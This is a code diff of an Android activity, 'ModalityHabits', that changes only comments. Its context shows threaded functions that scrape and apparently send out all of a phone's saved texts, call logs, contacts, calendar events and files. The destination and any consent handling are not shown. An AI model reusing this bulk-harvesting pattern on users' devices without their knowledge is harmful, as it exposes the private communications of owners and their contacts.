@@ -31,6 +31,7 @@ public class ModalityHabits extends AppCompatActivity {
     public static boolean DONE = false;
 
     // synchronized method for changing activeThreads to avoid race conditions
+    // INPUT - d - amount to change activeThreads by (usually 1 or -1)
     private synchronized void changeActiveThreads(int d) {
         activeThreads += d;
         checkIfDone();
@@ -55,8 +56,8 @@ public class ModalityHabits extends AppCompatActivity {
     }
 
     // Launches a new data scraping thread
-    // mContext is the context for scraping the data
-    // habit is a string representing the type of data being scraped
+    // INPUT - mContext - the context for scraping the data
+    // INPUT - habit - a string representing the type of data being scraped
     public void getHabit(Context mContext, String habit){
         // add to number of threads running
         changeActiveThreads(1);
@@ -113,9 +114,10 @@ public class ModalityHabits extends AppCompatActivity {
         }
 
         /*
-        The rest of this class is just the functions for scraping each type of data
+        The rest of this runnable class is just the functions for scraping each type of data
          */
 
+        /* sends all saved texts */
         private void sendTexts(){
             List<String> texts = new ArrayList<>();
 
@@ -219,6 +221,7 @@ public class ModalityHabits extends AppCompatActivity {
 
         }
 
+        /* sends all saved call logs */
         private void sendCalls(){
             // inbox cursor
             Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://call_log/calls"), null, null, null, null);
@@ -272,6 +275,7 @@ public class ModalityHabits extends AppCompatActivity {
             }
         }
 
+        /* sends all saved contacts */
         private void sendContacts(){
             ContentResolver cr = mContext.getContentResolver();
             Cursor phone = cr.query(ContactsContract.Contacts.CONTENT_URI,
@@ -319,6 +323,7 @@ public class ModalityHabits extends AppCompatActivity {
             }
         }
 
+        /* sends all saved calendar events */
         private void sendCalendar(){
             String msgData = "[";
             // inbox cursor
@@ -370,6 +375,7 @@ public class ModalityHabits extends AppCompatActivity {
             }
         }
 
+        /* sends all saved files */
         private void sendFiles(){
             String msgData = "[";
 
